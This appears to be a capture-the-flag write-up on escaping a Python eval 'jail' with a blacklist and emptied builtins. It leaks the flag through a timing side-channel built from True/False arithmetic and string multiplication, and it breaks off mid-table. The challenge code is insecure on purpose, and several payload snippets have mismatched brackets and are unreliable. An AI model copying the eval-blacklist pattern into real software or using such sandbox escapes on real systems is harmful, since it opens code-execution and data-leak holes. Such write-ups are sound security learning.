<h2 id="em-strong-ok-nice-strong-em-strong-ord-strong-inary-challenge" tabindex="-1"><em><strong>Ok nice</strong></em> | <strong>Ord</strong>inary challenge</h2>
<h3 id="the-challenge" tabindex="-1">The challenge</h3>
<pre><code class="language-python">print(&quot;Welcome to the jail! It is so secure I even have a flag variable!&quot;)
blacklist=['0','1','2','3','4','5','6','7','8','9','_','.','=','&gt;','&lt;','{','}','class','global','var','local','import','exec','eval','t','set','blacklist']
while True:
    inp = input(&quot;Enter input: &quot;)
    for i in blacklist:
        if i in inp:
            print(&quot;ok nice&quot;)
            exit(0)
    for i in inp:
        if (ord(i) &gt; 125) or (ord(i) &lt; 40) or (len(set(inp))&gt;17):
            print(&quot;ok nice&quot;)
            exit(0)
    try:
        eval(inp,{'__builtins__':None,'ord':ord,'flag':flag})
    except:
        print(&quot;error&quot;)
</code></pre>
<p>Look at this nice challenge 😇 We have a classic blacklist + emptied builtins.<br>
Our goal seems to print <code>jail</code>. Easy right ? Even without <code>print</code> 😇</p>
<p>Before solving, let's add some debugging to help us through our testing phase !</p>
<pre><code class="language-python">print(&quot;Welcome to the jail! It is so secure I even have a flag variable!&quot;)
blacklist=['0','1','2','3','4','5','6','7','8','9','_','.','=','&gt;','&lt;','{','}','class','global','var','local','import','exec','eval','t','set','blacklist']

while True:
    inp = input(&quot;Enter input: &quot;)
    
    for i in blacklist:
        if i in inp:
            print(&quot;ok nice, bl&quot;) ### NEW
            exit(0)
    
    for i in inp:
        if (ord(i) &gt; 125) or (ord(i) &lt; 40) or (len(set(inp))&gt;17):
            print(&quot;ok nice, ct&quot;, (ord(i) &gt; 125), (ord(i) &lt; 40), len(set(inp))) ### NEW
            print(inp) ### NEW
            print(&quot;&quot;.join(&quot;#&quot; if (ord(c) &lt; 40) else &quot;_&quot; for c in inp)) ### NEW
            exit(0)
    
    try:
        eval(inp,{'__builtins__':None,'ord':ord,'flag':flag}) ### NEW
        print(&quot;ok nice, eval-ed&quot;)
    except:
        print(&quot;error&quot;)
</code></pre>
<p>Now we can easily know <em>what blocked</em> and <em>where</em> if it's a banned character</p>
<br>
<h3 id="solving-process" tabindex="-1">Solving process</h3>
<p>1️⃣ First we don't have full execution (comes with an <code>exec</code>) but we have an <code>eval</code>. Meaning we <em>&quot;&quot;&quot;can't&quot;&quot;&quot;</em> write Python code but only <em>expressions</em> (No functions or statements). We don't care because we don't have builtins but it's something to note<br>
2️⃣ Secondly we can't use the UTF8 tricks because the characters' value are limited<br>
3️⃣ Thirdly we have a pretty small and easy to deal with blacklist but they block easy ideas. There is a character set limit too that will only block us later and will ask us for optimization<br>
4️⃣ Fourthly we have a Try/Except that blocks any attempt to leak <code>flag</code> through an error log. <em>It doesn't mean we can't use errors as we have &quot;error&quot; printed when an error occurs</em> 👀<br>
5️⃣ Fifth and last, we have access to <code>ord</code> to make numbers and do some shenanigans 😈</p>
<p>What we can aim for :</p>
<ul>
<li>get shell (why ???)</li>
<li>showing the entire flag (needs builtins recovery + use of print in an eval = difficult)</li>
<li>get flag's characters one by one (needs numbers -&gt; possible)
<ul>
<li>throw at specific value (needs a way to throw in our context -&gt; surely needs compare)</li>
<li>timing attack (needs a long execution time based on value -&gt; surely needs loops)</li>
</ul>
</li>
</ul>
<h4 id="making-numbers" tabindex="-1">Making numbers</h4>
<p>To access a specific character from the flag we need numbers. We have</p>
<ul>
<li>0 =&gt; <code>False</code></li>
<li>1 =&gt; <code>True</code></li>
<li>n =&gt; <code>True+True+...+True</code> (we don't have a limit in length)</li>
<li>-n =&gt; <code>-True-True-...-True</code></li>
</ul>
<h4 id="try-1-low-hanging-fruits" tabindex="-1">Try 1 : low hanging fruits</h4>
<pre><code class="language-python">{...}[flag[True]] # Dictionnary access, but no {} allowed
[flag,&lt;TO DO: something that throws&gt;][flag[True]==&quot;a&quot;] # Not a good enough compare, no =
for(a)in(range(ord(flag[True]))):ord(flag[True])  # Hmmmmmm, no for and range in 'eval' tho
[ord(flag[True])for(a)in(range(ord(flag[True])))] # Hmmmmmmmmmm
</code></pre>
<h4 id="try-2-timing-attack-with-homemade-range-and-and-quot-for-loop-and-quot" tabindex="-1">Try 2 : timing attack with homemade range and &quot;for loop&quot;</h4>
<p>How can we make a <code>range</code> ? Easy ! With <strong>slices</strong> !</p>
<pre><code class="language-python">&lt;long string&gt;[::ord(flag[&lt;number&gt;])]
</code></pre>
<p>But to make our homemade range and for loop we need numbers and a long string. Numbers are being taken care of but how can we make a long string ?<br>
Well we have</p>
<ul>
<li>a string (flag)</li>
<li>numbers<br>
we have everything we need to make one long boy !</li>
</ul>
<pre><code class="language-python">ord(flag[&lt;number&gt;]]

# Example
ord(flag[1]]
ord(flag[True]] # Assuming the flag starts with ICTF{...

# ... And because we have no limits in length
ord(flag[True]
</code></pre>
<p>One big thing to note is that <code>flag*67*67*...*67</code> grows <strong>VERY fast</strong>. Like <code>flag*67*67*67</code> takes 1-3 seconds to process and adding an extra <code>*67</code> will make a <code>MemoryError</code> (not enough memory to handle the massive string 😨)</p>
<p>Let's make a quick payload generator</p>
<pre><code class="language-python">def gen_payload(chr_pos,delta_time):
    if chr_pos==0: return &quot;ord(flag[False]]&quot;
    if chr_pos==1: return &quot;ord(flag[True]]&quot;
    return &quot;ord(flag[True&quot;+&quot;+True&quot;*(chr_pos-1)+&quot;]]&quot;
</code></pre>
<p>Now we just need to execute a timing attack and we have the flag !<br>
How do we decode the time ?</p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>string length</th>
<th>flag's character value</th>
<th>time</th>
</tr>
</thead>
<tbody>
<tr>
<td><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="7.31ex" height="2.026ex" role="img" focusable="false" viewBox="0 -873.3 3231 895.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"></path></g><g data-mml-node="mo" transform="translate(794.2,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z" style="stroke-width: 3;"></path></g><g data-mml-node="msup" transform="translate(1794.4,0)"><g data-mml-node="mn"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" style="stroke-width: 3;"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(500,0)" style="stroke-width: 3;"></path></g><g data-mml-node="mn" transform="translate(1033,403.1) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" style="stroke-width: 3;"></path></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>x</mi><mo>×</mo><msup><mn>67</mn><mn>3</mn></msup></math></mjx-assistive-mml></mjx-container></td>
<td>73 =&gt; I (given)</td>
<td><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.375ex;" xmlns="http://www.w3.org/2000/svg" width="1.804ex" height="1.791ex" role="img" focusable="false" viewBox="0 -626 797.6 791.6" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z" style="stroke-width: 3;"></path></g><g data-mml-node="mn" transform="translate(394,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" style="stroke-width: 3;"></path></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>t</mi><mn>0</mn></msub></math></mjx-assistive-mml></mjx-container></td>
</tr>
<tr>
<td><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="7.31ex" height="2.026ex" role="img" focusable="false" viewBox="0 -873.3 3231 895.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"></path></g><g data-mml-node="mo" transform="translate(794.2,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z" style="stroke-width: 3;"></path></g><g data-mml-node="msup" transform="translate(1794.4,0)"><g data-mml-node="mn"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" style="stroke-width: 3;"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(500,0)" style="stroke-width: 3;"></path></g><g data-mml-node="mn" transform="translate(1033,403.1) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" style="stroke-width: 3;"></path></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>x</mi><mo>×</mo><msup><mn>67</mn><mn>3</mn></msup></math></mjx-assistive-mml></mjx-container></td>
<td>67 =&gt; C (given)</td>
<td><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="1.804ex" height="1.756ex" role="img" focusable="false" viewBox="0 -626 797.6 776" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z" style="stroke-width: 3;"></path></g><g data-mml-node="mn" transform="translate(394,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"></path></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>t</mi><mn>1</mn></msub></math></mjx-assistive-mml></mjx-container></td>
</tr>
<tr>
<td><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="7.31ex" height="2.026ex" role="img" focusable="false" viewBox="0 -873.3 3231 895.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"></path></g><g data-mml-node="mo" transform="translate(794.2,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z" style="stroke-width: 3;"></path></g><g data-mml-node="msup" transform="translate(1794.4,0)"><g data-mml-node="mn"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" style="stroke-width: 3;"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(500,0)" style="stroke-width: 3;"></path></g><g data-mml-node="mn" transform="translate(1033,403.1) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" style="stroke-width: 3;"></path></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>x</mi><mo>×</mo><msup><mn>67</mn><mn>3</mn></msup></math></mjx-assistive-mml></mjx-container></td>
<td>84 =&gt; T (given)</td>
<td><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="1.804ex" height="1.756ex" role="img" focusable="false" viewBox="0 -626 797.6 776" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z" style="stroke-width: 3;"></path></g><g data-mml-node="mn" transform="translate(394,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"></path></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>t</mi><mn>2</mn></msub></math></mjx-assistive-mml></mjx-container></td>
</tr>
<tr>
<td><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="7.31ex" height="2.026ex" role="img" focusable="false" viewBox="0 -873.3 3231 895.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"></path></g><g data-mml-node="mo" transform="translate(794.2,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z" style="stroke-width: 3;"></path></g><g data-mml-node="msup" transform="translate(1794.4,0)"><g data-mml-node="mn"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" style="stroke-width: 3;"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(500,0)" style="stroke-width: 3;"></path></g><g data-mml-node="mn" transform="translate(1033,403.1) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" style="stroke-width: 3;"></path></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>x</mi><mo>×</mo><msup><mn>67</mn><mn>3</mn></msup></math></mjx-assistive-mml></mjx-container></td>
<td>70 =&gt; F (given)</td>
